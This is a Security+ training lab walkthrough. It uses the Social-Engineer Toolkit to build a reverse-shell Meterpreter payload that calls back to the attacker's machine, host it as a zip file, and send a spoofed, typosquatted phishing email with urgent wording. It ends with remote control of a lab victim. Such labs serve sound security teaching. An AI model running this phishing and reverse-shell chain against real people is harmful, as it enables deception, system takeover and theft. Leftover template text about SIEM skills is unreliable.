# Assisted Lab: Using SET to Perform Social Engineering

## Objective

This activity is designed to test your understanding of and ability to apply content examples in the following CompTIA Security+ objectives:

2.2 Explain common threat vectors and attack surfaces.
5.6 Given a scenario, implement security awareness practices.

### Skills Learned
[Bullet Points - Remove this afterwards]

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used

- 

## Steps

### Explore SET and Configure a Payload

The Social-Engineer Toolkit (SET) is a Python-based open-source social engineering framework for simulating and performing attacks. It has a text-based, menu-driven interface that is included with Kali or can be installed on other systems.

1. Connect to the KALI and sign in as root using Pa$$w0rd as the password.

2. Open a Terminal window by selecting the Terminal Emulator from the Kali Linux toolbar.

3. Maximize the Terminal window.

4. SET can be started from the menus or by entering setoolkit.

    - Since SET is menu driven, you must type in the number associated with your choice and select the ENTER key. To go back up within the menu tree, type 99 and press ENTER. Typing 99, then ENTER at the top level menu will exit SET.

    - The bulk of SET's functionality can be found under the Social-Engineering Attacks menu option, 1.

Sec-Lab04 - SET main menu.jpg

5. Enter 1 to select the Social-Engineering Attacks menu item.

    - Some of the most commonly used areas of SET include spear phishing, website spoofing, payload delivery, and mass mailer attacks. Let's take a brief look at each area.

    - All of the elements of SET that you will explore and use in this lab are from this Social-Engineering Attacks menu of 10 items. If you end up at the top-level main menu of only 6 items, then enter 1 to access the Social-Engineering Attacks menu (technically a sub-menu).

Sec-Lab04 - SET Social-Engineering Attacks sub-menu.jpg

6. Enter 1 to select the Spear-Phishing Attack Vectors menu item.

  Under this option, SET has three choices:

  - Perform a Mass Email Attack enables a user to send a phishing email to one or more recipients and walks the user through creating the payload and setting up a listener.
  - Create a FireFormat Payload allows the user to customize the options to create a payload.
  - Create a Social-Engineering Template enables to user to create a new template for a new custom pretext or attack.
  - The attacks in SET are well known and generally will be found by antimalware and IDS products if used with their default settings and no further obfuscation.

7. Let's continue the tour. Enter 99 to return to the Social-Engineering Attacks menu.

8. Enter 2 to select Website Attack Vectors.

    -  needed, scroll up to see the full display of information, but as you can see, SET supports several web-based attacks. Some of these would require the user to build or control an existing website to deploy the exploit. Others allow the user to clone an existing website for such attacks as credential harvesting.

9. Once again, enter 99 to return to the Social-Engineering Attacks menu.

10. Enter 3 to select Infectious Media Generator.

    - SET can create a USB, CD, or DVD, which will run automatically to launch a Metasploit payload.

11. Enter 99 to return to the Social-Engineering Attacks menu.

12. Enter 4 to select Create a Payload and Listener.

    - SET can create numerous payloads which can open a shell on a target and connect it back to a listener. SET can work with Metasploit to create payloads and launch listeners. You would have to get your target to run your payload (for example, by tricking them into opening an attachment) or inject and run it yourself on a target system. The reverse shell gives you control over the remote system and has many embedded features, including keylogging.

13. You will return to this SET feature in the following exercise to create a payload, initiate a listener, and send a phishing message. For now, use the keystroke combo of CTRL+C to exit this sub-section of SET and return to the SET main menu.

14. Enter 1 to select the Social-Engineering Attacks menu item.

15. Enter 5 to select Mass Mailer Attacks.

16. Enter no when prompted "Start Sendmail? [yes|no]:".

  - There are two options for Mass Mailer Attacks:
  1) Sending to an individual email address
  2) Import a list to send to multiple email addresses.

17. You will return to this SET feature in the following exercise to configure an email phishing attack against an employee of Structureality. For now, use the keystroke combo of CTRL+C to exit this sub-section of SET and return to the SET main menu.

18. Enter 1 to select the Social-Engineering Attacks menu item.

19. Enter 6 to select Arduino-Based Attack Vector.

    - You may need to scroll up to view all of the information presented regarding Arduino-based attacks. This collection of tools can take advantage of an Arduino device's capabilities to create hardware-delivered attacks to a target. This section also includes attacks for X10-based communication devices.

20. Enter 99 to return to the Social-Engineering Attacks menu.

21. Enter 7 to select Wireless Access Point Attack Vector.

22. The wireless attacks of SET are used to set up a DNS attacker-in-the-middle (a.k.a., on-path) attack. This can be used to inject yourself into a WiFi network in order to perform other SET-based exploitations. These attacks require certain wireless adapters and several other wireless tools and utilities.

23. Enter 99 to return to the Social-Engineering Attacks menu.

24. Enter 8 to select QRCode Generator Attack Vector.

    - SET can be used to generate a QR code for any URL you provide. The URL could point to a SET attack, a legitimate site, or an unexpected location (such as https://www.youtube.com/embed/dQw4w9WgXcQ). QR codes can be distributed as digital images or printed onto brochures, posters, or stickers.

25. Enter 99 to return to the Social-Engineering Attacks menu.

26. Enter 9 to select Powershell Attack Vectors.

    - SET can be used to deliver PowerShell scripts to targets or initiate remote access to a target's PowerShell.

27. Enter 99 to return to the Social-Engineering Attacks menu.

28. Enter 10 to select Third Party Modules.

    - SET supports third-party attacks and utilities. A few third-party modules are included with the default installation of SET, but you can often obtain modules from other developers or create your own. There are guidelines for module development available.

29. Enter 99 to return to the Social-Engineering Attacks menu.

30. Leave the Terminal window open for the next exercise.

#### Check your work

Confirm that you launched SET

Confirm that you explored the options of SET

### Create a Spear Phishing Message

For this section, you will set up an email phishing attack against an employee of Structureality.

1. Return to the Terminal window left open from the previous exercise. You should still see the Social-Engineering Attacks menu with its 10 options.

    - There is an unexpected complexity when using SET to create completed social engineering attacks, especially those including a reverse shell mechanism. The option to build a payload includes the option to launch the listener. However, if the listener is launched, SET is locked into waiting for a connection. If you build the payload but don't launch the listener, once you have sent the email to the victim (whether using a web server host or as an attachment), you have to re-create the payload to launch the listener. So, to avoid this conundrum, you need to use two instances of SET. One will be used to create the payload and launch the listener, and the second will be used to craft and send the phishing email with the payload access link.

    Work through the steps of creating an exploit payload that will initiate a reverse shell from the victim back to the Kali VM:

2. Enter 4 to select Create a Payload and Listener.

3. Enter 2 to select Windows Reverse_TCP Meterpreter.

4. Enter 10.1.16.66 to set up the Listener IP address to the Kali VM IP address.

5. Enter 443 as the port for the Listener.

  The payload will be generated, and the file will be saved as /root/.set/payload.exe. This process may take 10-20 seconds.

    - If you repeat the payload creation process, SET always uses the same default name of payload.exe and will overwrite any previous payload. If you want to keep a previously created payload, rename it before creating another.

6. Enter y at the prompt "Do you want to start the payload and listener now? (yes/no):".

7. SET will automatically launch the MSFconsole and initiate the listening session. The interface will display the prompt: msf6 exploit(multi/handler) >

8. Leave this Terminal window open and allow it to remain at the msf6 prompt.

    - Many client utilities will strip or block attachments and downloads that are obviously executables, so you must encapsulate payload.exe into a zip file to ensure it will reach the target.

9. Open an additional Terminal window by selecting the Terminal Emulator from the Kali Linux toolbar.

10. Enter cd /root/.set to change into the app directory where SET stored the payload.exe file.

11. Enter zip /var/www/html/acctupd.zip payload.exe

    This command zips the payload.exe into a file located in the root directory of the Kali web server. Performing the zip operation while being in the same directory as the payload.exe file ensures that the zip file does not contain sub-directories.

12. Enter service apache2 start

    This command starts the pre-installed Apache web server on Kali.

    - It is theoretically possible to send an attachment as part of the SET email attack. However, that feature is not functional in the lab environment. So, you are substituting a download link for an attachment.

Now you need to launch a second instance of SET to create and send the phishing email with the malicious hyperlink.

13. Enter setoolkit.

14. Enter 1 to select the Social-Engineering Attacks menu item.

15. Enter 5 to select Mass Mailer Attacks.

16. Enter yes when prompted "Start Sendmail? [yes|no]:".

    It can take a few minutes for Sendmail to fully launch and be ready to forward your messages to the target. However, the following steps to generate the malicious email should take enough time to allow Sendmail to be ready for use.

17. Enter 1 to select Email Attack Single Email Address.

18. Enter jaime@structureality.com for Send email to:

19. Enter 2 to select own server or open relay.

    - SET supports sending emails through Gmail in addition to your own server or an open mail relay.

20. Enter support@structurealty.com as the From address.

    - Notice that this is a spoofed false email address. The domain name is missing the "i". Thus, instead of structureality it is structurealty. The use of slight mis-spellings of names is a common trick hackers use to fool targets into believing a message is from a legitimate source.

21. Enter Support Department as the From name.

    - It is common practice to spoof the From address to trick the recipient into believing the attack email is from a legitimate entity.

22. Enter y to flag the email as high priority.

23. Enter n regarding adding an attachment.

24. Enter n regarding adding an inline attachment.

25. Type Important Account Update as the Email Subject: and press ENTER.

26. Enter h to send this email in HTML format.

27. Now type in the first line of text of the email: Please download, extract, and run the update file from this link: <A HREF=http://10.1.16.66/acctupd.zip>Update</A><BR>, then press ENTER.

28. Now type in the second line of text of the email: Otherwise, your certs will automatically expire!<BR>, then press ENTER.

    - You could type in messaging about the victim not worrying about the executable being unsigned, from an unknown source, might be malicious, etc. Instead, we will assume such guidance is implied so that the victim will overly trust the claimed Support Department message and run the payload as instructed despite any local warnings against this.

29. Now type in the third line of text of the email: Sincerely,<BR> Support Department, then press ENTER.

30. Type: END in all caps on the Next line of the body: to finish. Then ENTER.

31. SET will attempt to send the email to the targeted client victim. If successful, you should see the message:
SET has finished sending the emails
Press <return> to continue

32. Press ENTER. You will be returned to the SET Social-Engineering Attacks menu.

33. Minimize this Terminal window and return to the original Terminal window containing the MSF6 prompt.

34. Leave the Terminal windows open.

#### Check your work

Confirm that you configured a mass mailer attack with SET.

Confirm that you configured a reverse shell meterpreter payload.

Confirm that you created a zip of the payload and hosted it on a web server.

Confirm that you set a spoofed email with a malicious link to a victim using SET.

### Be an email phishing victim

1. Connect to the MS10 VM, send Ctrl+Alt+Delete, and sign in as Jaime using Pa$$w0rd as the password.

2. Minimize or close Server Manager if it appears. It will not be used in this lab.

3. Double-click to open Thunderbird from the Desktop.

4. Once Thunderbird is open, select the Inbox tab.

5. Select Inbox in the left navigation pane under jaime@structureality.com.

    - There is a bug in SET that causes the phishing email to be sent twice.

6. If no messages are shown, select Get Messages from the Thunderbird toolbar.

7. Notice that Jaime has received an Important Account Update message.

8. Select the Important Account Update email message.

9. Select the Update link in the message body.

10. The Microsoft Edge browser should open, and the file will be downloaded. You should see the Downloads window, which will show the progress of the file. Once the download is complete, position your cursor near the acctupd.zip filename, then click on the Show in folder icon (which looks like a file folder).

11. A File Explorer will open to the Downloads folder. Double click acctupd to view the contents of this archive file.

    - File Explorer does not display file extensions by default.

12. Double-click payload.

13. After several seconds, the Open File - Security Warning is displayed.

14. Assuming the victim is fooled into proceeding anyway, select Run.

    - The warnings against following questionable hyperlinks, downloading suspicious files, and executing potentially harmful files will be displayed automatically on most systems. However, clients can be fooled by clever social-engineering claims to ignore these warnings. It is essential that organizations keep these warnings in place and train personnel to respect them and report issues to the security team.

15. From the victim's perspective, nothing will seem to have happened once the payload.exe is executed. However, a reverse shell has been established from the victim's system to the attacker's system.

16. Leave all windows open on MS10.

#### Check your work

Confirm that you acted like a victim and fell for a phishing attack.

Confirm that you opened an email message, clicked on a link, downloaded a file, then executed the file.

### Exploit the victim through the established reverse shell

1. Connect to the KALI and, if needed, sign in as root using Pa$$w0rd as the password.

2. The Terminal window where the MSF6 prompt should still be open.

3. You should now seevmessages similar to the following:

    - [*] Sending stage (175686 bytes) to 10.1.16.2
    - [*] Meterpreter session 1 opened (10.1.16.66:443 -> 10.1.16.2:55419) at...
    - You might not see a prompt after the connection of the meterpreter session. Instead, the cursor will be at the beginning of a blank line. You can enter your next command, and the prompt will re-appear.

4. Enter sessions to view a list of current sessions.

5. Enter sessions -i 1 to connect to the established session.

6. Enter sysinfo to view information about the system. Including the computer/hostname.

7. Enter getuid to view the account, which was compromised by the social engineering exploit leading to a reverse shell. This user account establishes the user-privilege context by which meterpreter is restricted.

8. Enter help to view a list of other commands that could be used through meterpreter against this victim system.

At this point, you have successfully tricked a victim into running malicious code that directly led to an attacker having remote control access to the victim's system.

#### Check your work

Confirm that you established a remote control session via reverse shell to the victim.
